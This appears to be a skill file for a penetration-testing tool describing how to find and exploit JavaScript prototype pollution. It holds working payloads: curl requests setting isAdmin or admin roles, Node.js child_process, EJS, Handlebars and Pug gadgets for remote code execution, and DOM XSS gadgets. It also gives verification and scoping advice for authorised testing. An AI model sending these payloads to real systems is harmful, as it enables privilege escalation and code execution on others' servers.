---
name: attack-prototype-pollution
description: "Detect prototype pollution with harmless marker properties and verify server-side or client-side impact separately"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - prototype-pollution
  - javascript
  - web
  - xss
  - attack
tech_stack:
  - javascript
  - nodejs
  - web
cwe_ids:
  - CWE-1321
chains_with:
  - attack-ssti
prerequisites: []
severity_boost:
  attack-ssti: "Prototype pollution → SSTI gadgets = RCE"
---

# Prototype Pollution

## Objective

Exploit JavaScript prototype pollution to modify Object.prototype, leading to XSS, privilege escalation, or RCE via gadget chains.

## Testing Methodology

### Phase 1: Client-Side Detection

**URL-based pollution:**
```
https://TARGET/?__proto__[polluted]=1
https://TARGET/?__proto__.polluted=1
https://TARGET/?constructor[prototype][polluted]=1
https://TARGET/#__proto__[polluted]=1
```

Verify in browser console:
```javascript
console.log(({}).polluted) // Should print "1" if vulnerable
```

### Phase 2: JSON Body Pollution

```bash
# Merge/patch endpoints
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

curl --max-time 15 --connect-timeout 5 -X PATCH https://TARGET/api/user/profile \
  -d '{"constructor": {"prototype": {"role": "admin"}}}'

# Nested object merge
curl --max-time 15 --connect-timeout 5 -X PUT https://TARGET/api/config \
  -d '{"a": {"__proto__": {"polluted": true}}}'
```

### Phase 3: Server-Side Detection (Node.js)

```bash
# RCE via child_process gadget
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"child_process\").execSync(\"id\").toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}'

# EJS template gadget
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/settings \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# Handlebars gadget
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/settings \
  -d '{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "params": [], "path": {"type": "PathExpression", "original": "constructor"}}]}}'
```

### Phase 4: Client-Side Gadgets

Common DOM gadgets when `Object.prototype` is polluted:

```javascript
// innerHTML gadget
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// src gadget
Object.prototype.src = 'javascript:alert(1)'

// href gadget
Object.prototype.href = 'javascript:alert(1)'

// data-* attributes
Object.prototype['data-tooltip'] = '<img src=x onerror=alert(1)>'
```

### Phase 5: Framework-Specific

**Express.js / Pug:**
```json
{"__proto__": {"block": {"type": "Text", "val": "x]));process.exit()//"}}}
```

**Lodash merge:**
```json
{"__proto__": {"polluted": true}}
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Server-side RCE via prototype pollution gadget | Critical (P1) |
| Privilege escalation (isAdmin=true) | Critical (P1) |
| Client-side XSS via DOM gadget | High (P2) |
| Prototype pollution without known gadget | Medium (P3) |

## Evidence Requirements

- Endpoint accepting merge/deep-copy of user input
- Payload sent (__proto__ or constructor.prototype)
- Proof of pollution (new property on empty object)
- For RCE: command output
- For XSS: JavaScript execution proof

## Verification and False Positives

- Start with a unique, harmless marker property and confirm whether it persists into an unexpected object or prototype. An input containing `__proto__` or `constructor.prototype` is not proof by itself.
- Distinguish client-side JavaScript pollution from server-side pollution. Use a fresh test context and check whether the marker changes behavior outside the original request.
- Do not jump from a pollution primitive to RCE, authorization bypass, or XSS. Demonstrate a reachable gadget and concrete impact separately; avoid destructive payloads or command execution.
- Check parsing libraries, sanitizers, and framework behavior with a baseline request. A literal marker reflected in JSON may simply be data, not a prototype mutation.
- Use only test-owned data, bounded requests, and sanitized evidence. Report the primitive and the demonstrated impact as separate claims when impact is limited.
## Source-to-Sink Validation Matrix

Separate server-side prototype pollution from client-side pollution and trace the complete source-to-sink path:

| Stage | Questions | Evidence |
|---|---|---|
| Source | Does user-controlled JSON, query data, or merge input reach an unsafe object operation? | minimal harmless input and endpoint |
| Primitive | Is a prototype or inherited property actually changed? | controlled before/after observable behavior |
| Reachability | Does the polluted property reach a sensitive configuration or application decision? | call path or deterministic behavior difference |
| Impact | Does it change authorization, execution, response integrity, or availability? | safe, reproducible effect in a test instance |
| Persistence | Is the effect request-local, process-wide, or browser-session-local? | repeat with a clean request/session and note scope |

Prefer harmless marker properties and isolated test instances. Do not alter production process configuration, attempt destructive denial of service, or claim RCE merely because a pollution primitive exists. Demonstrate the actual downstream impact and whether it survives a clean request.

Include the exact input location, affected object/merge behavior, runtime context, clean baseline, observed effect, and a minimal sanitized PoC. Explain whether the issue is client-side or server-side and avoid double-counting the primitive and its downstream impact as separate findings unless they are independently exploitable.

## References

- [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
